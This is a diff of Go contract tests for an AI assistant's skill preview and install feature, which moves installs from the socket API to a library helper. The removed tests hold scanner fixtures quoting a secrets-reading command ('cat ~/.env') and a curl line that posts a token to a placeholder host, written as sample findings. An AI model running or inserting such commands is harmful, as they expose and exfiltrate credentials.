@@ -56,289 +56,9 @@ func TestSkillsApprove_DTOConformsToContract(t *testing.T) {
 	validateJSON(t, schema, mustMarshal(map[string]string{"name": "deploy", "status": "approved"}), "skills.approve DTO")
 }
 
-func TestSkillsPreview_DTOConformsToContract(t *testing.T) {
-	schema := loadSchema(t, "skills.preview.schema.json")
-	for _, tc := range []struct {
-		name   string
-		result skill.PreviewResult
-	}{
-		{
-			name: "with findings",
-			result: skill.PreviewResult{
-				Name: "deploy", Description: "Deploy the service", Body: "cat ~/.env\n",
-				URL: "https://example.com/SKILL.md",
-				// Two findings, in two DIFFERENT files: a bundle is scanned
-				// whole, so the shape a viewer has to render is a list whose
-				// entries do not all name the document (nocx-872jc.4).
-				Findings: []skill.Finding{
-					{Path: "SKILL.md", PatternID: "read_secrets", Line: "cat ~/.env", LineNumber: 1},
-					{Path: "scripts/setup.sh", PatternID: "exfil_curl", Line: "curl -d @- https://x/$TOKEN", LineNumber: 4},
-				},
-				Files: []string{"SKILL.md", "references/notes.md", "scripts/setup.sh"},
-			},
-		},
-		{
-			// The empty case is the one a hand-built fixture gets wrong: a
-			// nil slice marshals as null, and the renderer's first .map on
-			// it throws. The manifest has no empty case at all — a skill
-			// that references nothing is still one file — so it carries the
-			// one entry rather than [].
-			name: "no findings",
-			result: skill.PreviewResult{
-				Name: "deploy", Description: "Deploy the service", Body: "body\n",
-				URL: "https://example.com/SKILL.md", Findings: []skill.Finding{},
-				Files: []string{"SKILL.md"},
-			},
-		},
-	} {
-		t.Run(tc.name, func(t *testing.T) {
-			raw, err := json.Marshal(tc.result)
-			if err != nil {
-				t.Fatal(err)
-			}
-			validateJSON(t, schema, raw, "skills.preview DTO")
-		})
-	}
-}
-
-// The real result, off the real socket: a fake local endpoint serves a
-// SKILL.md and the shipped handler answers with what a person would read.
-func TestSkillsPreview_OverTheWireConformsToContract(t *testing.T) {
-	document := "---\nname: deploy\ndescription: Deploy the service\n---\n" +
-		"Run the deploy script.\ncat ~/.env\n"
-	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
-		w.Header().Set("Content-Type", "text/markdown; charset=utf-8")
-		_, _ = w.Write([]byte(document))
-	}))
-	defer srv.Close()
-
-	configDir := t.TempDir()
-	conn, cleanup := skillsURLConnection(t, configDir)
-	defer cleanup()
-
-	resp := jsonrpcCall(t, conn, "skills.preview", map[string]any{"url": srv.URL + "/anything/SKILL.md"})
-	var env rpcEnvelope
-	if err := json.Unmarshal(resp, &env); err != nil {
-		t.Fatal(err)
-	}
-	if env.Error != nil {
-		t.Fatalf("unexpected error: %+v", env.Error)
-	}
-	validateJSON(t, loadSchema(t, "skills.preview.schema.json"), env.Result, "skills.preview wire")
-
-	var got skill.PreviewResult
-	if err := json.Unmarshal(env.Result, &got); err != nil {
-		t.Fatal(err)
-	}
-	if got.Name != "deploy" || got.Description != "Deploy the service" {
-		t.Errorf("preview = %+v", got)
-	}
-	if !strings.Contains(got.Body, "Run the deploy script.") {
-		t.Errorf("body = %q, want the whole body", got.Body)
-	}
-	if len(got.Findings) != 1 || got.Findings[0].PatternID != "read_secrets" {
-		t.Errorf("findings = %+v", got.Findings)
-	}
-	// Nothing was written: preview is the half that lets a person read
-	// before deciding, so the library is untouched by it.
-	entries, err := os.ReadDir(filepath.Join(configDir, "installed-skills"))
-	if err != nil && !os.IsNotExist(err) {
-		t.Fatal(err)
-	}
-	if len(entries) != 0 {
-		t.Fatalf("skills.preview wrote %d entries into the installed root", len(entries))
-	}
-}
-
-// The bundle over the real socket: a skill whose body sends the assistant to
-// its own reference file installs with that file beside it, and the manifest
-// the person was shown names both (nocx-0bsa4.1).
-//
-// It is asserted HERE, off the socket, rather than only in internal/skill,
-// because the manifest is a wire field and the shape a hand-built fixture
-// agrees with is not evidence that the server sends it.
-func TestSkillsInstall_TheBundleTravelsOverTheWire(t *testing.T) {
-	document := "---\nname: deploy\ndescription: Deploy the service\n---\n" +
-		"Read [the notes](references/notes.md) before you start.\n"
-	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "text/markdown; charset=utf-8")
-		switch r.URL.Path {
-		case "/skills/deploy/SKILL.md":
-			_, _ = w.Write([]byte(document))
-		case "/skills/deploy/references/notes.md":
-			_, _ = w.Write([]byte("# Notes\n\nStart the service first.\n"))
-		default:
-			http.NotFound(w, r)
-		}
-	}))
-	defer srv.Close()
-
-	configDir := t.TempDir()
-	conn, cleanup := skillsURLConnection(t, configDir)
-	defer cleanup()
-	url := srv.URL + "/skills/deploy/SKILL.md"
-
-	env := callSkills(t, conn, "skills.preview", url)
-	if env.Error != nil {
-		t.Fatalf("preview: %+v", env.Error)
-	}
-	validateJSON(t, loadSchema(t, "skills.preview.schema.json"), env.Result, "skills.preview wire")
-	var preview skill.PreviewResult
-	if err := json.Unmarshal(env.Result, &preview); err != nil {
-		t.Fatal(err)
-	}
-	if len(preview.Files) != 2 || preview.Files[0] != "SKILL.md" || preview.Files[1] != "references/notes.md" {
-		t.Fatalf("files = %v, want the document and the file its body names", preview.Files)
-	}
-
-	if env := callSkills(t, conn, "skills.install", url); env.Error != nil {
-		t.Fatalf("install: %+v", env.Error)
-	}
-	notes := filepath.Join(configDir, "installed-skills", "deploy", "references", "notes.md")
-	landed, err := os.ReadFile(notes) //nolint:gosec // the path is this test's own temporary directory
-	if err != nil {
-		t.Fatalf("the file the manifest named did not land: %v", err)
-	}
-	if string(landed) != "# Notes\n\nStart the service first.\n" {
-		t.Errorf("landed = %q, want the bytes the manifest was taken over", landed)
-	}
-}
-
-// A refusal reaches the person as the backend's own sentence, naming the
-// step that refused, rather than a transport sentence about an internal
-// error.
-func TestSkillsPreview_RefusalTravelsAsItsOwnSentence(t *testing.T) {
-	conn, cleanup := skillsURLConnection(t, t.TempDir())
-	defer cleanup()
-	resp := jsonrpcCall(t, conn, "skills.preview", map[string]any{"url": "not a url"})
-	var env rpcEnvelope
-	if err := json.Unmarshal(resp, &env); err != nil {
-		t.Fatal(err)
-	}
-	if env.Error == nil {
-		t.Fatal("want a refusal")
-	}
-	if !strings.Contains(env.Error.Message, "address") {
-		t.Errorf("refusal = %q", env.Error.Message)
-	}
-}
-
-func TestSkillsInstall_DTOConformsToContract(t *testing.T) {
-	schema := loadSchema(t, "skills.install.schema.json")
-	raw, err := json.Marshal(skill.InstallResult{Name: "deploy", Provenance: skill.ProvenanceInstalled})
-	if err != nil {
-		t.Fatal(err)
-	}
-	validateJSON(t, schema, raw, "skills.install DTO")
-}
-
-// The real result, off the real socket, and the whole gesture: a fake local
-// endpoint serves a SKILL.md, the person reads it, the person approves it,
-// and the shipped handler writes it and records where it came from.
-func TestSkillsInstall_OverTheWireConformsToContract(t *testing.T) {
-	document := "---\nname: deploy\ndescription: Deploy the service\n---\n" +
-		"Run the deploy script.\ncat ~/.env\n"
-	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
-		_, _ = w.Write([]byte(document))
-	}))
-	defer srv.Close()
-
-	configDir := t.TempDir()
-	conn, cleanup := skillsURLConnection(t, configDir)
-	defer cleanup()
-	url := srv.URL + "/anything/SKILL.md"
-
-	// Nothing is installed that has not been read, so the read comes first —
-	// over the same socket, because it is the SERVER's record of what was
-	// shown that the install compares its second fetch against.
-	if env := callSkills(t, conn, "skills.preview", url); env.Error != nil {
-		t.Fatalf("preview: %+v", env.Error)
-	}
-
-	env := callSkills(t, conn, "skills.install", url)
-	if env.Error != nil {
-		t.Fatalf("unexpected error: %+v", env.Error)
-	}
-	validateJSON(t, loadSchema(t, "skills.install.schema.json"), env.Result, "skills.install wire")
-
-	var got skill.InstallResult
-	if err := json.Unmarshal(env.Result, &got); err != nil {
-		t.Fatal(err)
-	}
-	if got.Name != "deploy" || got.Provenance != skill.ProvenanceInstalled {
-		t.Errorf("install = %+v", got)
-	}
-
-	body, err := os.ReadFile(filepath.Join(configDir, "installed-skills", "deploy", "SKILL.md")) //nolint:gosec // test-owned temp dir
-	if err != nil {
-		t.Fatalf("the skill was not written: %v", err)
-	}
-	if !strings.Contains(string(body), "Run the deploy script.") {
-		t.Errorf("written file = %q", body)
-	}
-	// Both halves of the record, in the document the next start reads.
-	var doc struct {
-		Digests map[string]string `json:"digests"`
-		Sources map[string]struct {
-			URL string `json:"url"`
-		} `json:"sources"`
-	}
-	raw, err := os.ReadFile(filepath.Join(configDir, "skills.json")) //nolint:gosec // test-owned temp dir
-	if err != nil {
-		t.Fatal(err)
-	}
-	if err := json.Unmarshal(raw, &doc); err != nil {
-		t.Fatal(err)
-	}
-	if doc.Digests["deploy"] == "" {
-		t.Error("no digest was recorded, so the skill is changed and will never be used")
-	}
-	if doc.Sources["deploy"].URL != url {
-		t.Errorf("recorded source = %q, want %q", doc.Sources["deploy"].URL, url)
-	}
-}
-
-// Nothing is installed that has not been read, and the refusal says so in the
-// backend's own words rather than as a transport sentence about an internal
-// error.
-func TestSkillsInstall_RefusesWhatWasNeverPreviewed(t *testing.T) {
-	document := "---\nname: deploy\ndescription: Deploy the service\n---\nbody\n"
-	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
-		_, _ = w.Write([]byte(document))
-	}))
-	defer srv.Close()
-
-	configDir := t.TempDir()
-	conn, cleanup := skillsURLConnection(t, configDir)
-	defer cleanup()
-
-	env := callSkills(t, conn, "skills.install", srv.URL+"/anything/SKILL.md")
-	if env.Error == nil {
-		t.Fatal("want a refusal")
-	}
-	if !strings.Contains(env.Error.Message, "read the document first") {
-		t.Errorf("refusal = %q", env.Error.Message)
-	}
-	if _, err := os.Stat(filepath.Join(configDir, "installed-skills", "deploy")); !os.IsNotExist(err) {
-		t.Errorf("a refused install left something on disk: %v", err)
-	}
-}
-
-// callSkills is one JSON-RPC round trip for a method whose params are one
-// address, decoded into the envelope both assertions read.
-func callSkills(t *testing.T, conn *websocket.Conn, method, url string) rpcEnvelope {
-	t.Helper()
-	resp := jsonrpcCall(t, conn, method, map[string]any{"url": url})
-	var env rpcEnvelope
-	if err := json.Unmarshal(resp, &env); err != nil {
-		t.Fatal(err)
-	}
-	return env
-}
-
 // The real list, off the real socket, over the three rows that make the
 // source field mean something (nocx-qja4m.9). The skill it asserts about was
-// installed BY THE SHIPPED HANDLER earlier in this test rather than written
+// installed BY THE SHIPPED LIBRARY earlier in this test rather than written
 // into a fixture: a payload the test built itself would prove the struct is
 // well-formed, not that the server sends the field.
 func TestSkillsList_OverTheWireConformsToContract(t *testing.T) {
@@ -355,15 +75,10 @@ func TestSkillsList_OverTheWireConformsToContract(t *testing.T) {
 	writeSkillFile(t, filepath.Join(configDir, "skills", "deploy"), "deploy", "Deploy the service")
 	writeSkillFile(t, filepath.Join(configDir, "installed-skills", "byhand"), "byhand", "Put here with mv")
 
-	conn, cleanup := skillsURLConnection(t, configDir)
+	conn, store, cleanup := skillsURLConnection(t, configDir)
 	defer cleanup()
 	url := srv.URL + "/anything/SKILL.md"
-	if env := callSkills(t, conn, "skills.preview", url); env.Error != nil {
-		t.Fatalf("preview: %+v", env.Error)
-	}
-	if env := callSkills(t, conn, "skills.install", url); env.Error != nil {
-		t.Fatalf("install: %+v", env.Error)
-	}
+	installThroughTheLibrary(t, store, url)
 
 	resp := jsonrpcCall(t, conn, "skills.list", map[string]any{})
 	var env rpcEnvelope
@@ -526,11 +241,18 @@ func skillsContractConnection(t *testing.T) (*websocket.Conn, func()) {
 	return conn, func() { _ = conn.Close(); _ = ws.Stop(ctx) }
 }
 
-// skillsURLConnection is the shipped store over the four roots with the
-// real fetch seam wired, which both skills.preview and skills.install reach — apifetch over httppolicy's direct route, which is
-// what lets these tests drive a loopback endpoint through the same transport
-// the product uses.
-func skillsURLConnection(t *testing.T, configDir string) (*websocket.Conn, func()) {
+// skillsURLConnection is the shipped store over the four roots with the real
+// fetch seam wired — apifetch over httppolicy's direct route, which is what
+// lets these tests drive a loopback endpoint through the same transport the
+// product uses.
+//
+// THE STORE COMES BACK WITH THE CONNECTION because acquisition is no longer a
+// method on this socket (nocx-ojfuc.4). Installing is the assistant's tool and
+// it runs in Go, so a test that needs an installed row to ask skills.list
+// about installs it the way the product does — through the library — and then
+// asks the wire. Reaching for a `skills.install` request here would be reaching
+// for a method nothing sends.
+func skillsURLConnection(t *testing.T, configDir string) (*websocket.Conn, *skill.Store, func()) {
 	t.Helper()
 	routes := func(_ context.Context, routeID string) (httppolicy.Route, error) {
 		if routeID != "" {
@@ -549,7 +271,22 @@ func skillsURLConnection(t *testing.T, configDir string) (*websocket.Conn, func(
 		t.Fatalf("Start: %v", err)
 	}
 	conn := connectWS(t, ws)
-	return conn, func() { _ = conn.Close(); _ = ws.Stop(ctx) }
+	return conn, store, func() { _ = conn.Close(); _ = ws.Stop(ctx) }
+}
+
+// installThroughTheLibrary adopts one address the way the assistant's executor
+// does: the read that remembers the digest, then the write that refuses
+// anything else. It is the shipped pair (internal/skill), reached in Go
+// because that is where the only caller of it now lives.
+func installThroughTheLibrary(t *testing.T, store *skill.Store, url string) {
+	t.Helper()
+	ctx := context.Background()
+	if _, err := store.Preview(ctx, url); err != nil {
+		t.Fatalf("preview: %v", err)
+	}
+	if _, err := store.Install(ctx, url); err != nil {
+		t.Fatalf("install: %v", err)
+	}
 }
 
 func TestSkillsFile_DTOConformsToContract(t *testing.T) {
@@ -886,7 +623,7 @@ func skillsFileConnection(t *testing.T) (*websocket.Conn, func()) {
 // else touches it, `status` is the digest comparison and nothing else touches
 // that.
 //
-// Installed by the shipped handler, turned on through the shipped handler,
+// Installed by the shipped library, turned on through the shipped handler,
 // and changed on disk the way a person's editor would change it. A fixture
 // this test built itself would prove the struct is well-formed, not that the
 // server computes the state.
@@ -898,15 +635,9 @@ func TestSkillsList_OverTheWireTellsTheTwoKindsOfOffApart(t *testing.T) {
 	defer srv.Close()
 
 	configDir := t.TempDir()
-	conn, cleanup := skillsURLConnection(t, configDir)
+	conn, store, cleanup := skillsURLConnection(t, configDir)
 	defer cleanup()
-	url := srv.URL + "/anything/SKILL.md"
-	if env := callSkills(t, conn, "skills.preview", url); env.Error != nil {
-		t.Fatalf("preview: %+v", env.Error)
-	}
-	if env := callSkills(t, conn, "skills.install", url); env.Error != nil {
-		t.Fatalf("install: %+v", env.Error)
-	}
+	installThroughTheLibrary(t, store, srv.URL+"/anything/SKILL.md")
 
 	// Off because nobody has turned it on: the switch is off and the bytes
 	// are the ones the install recorded.
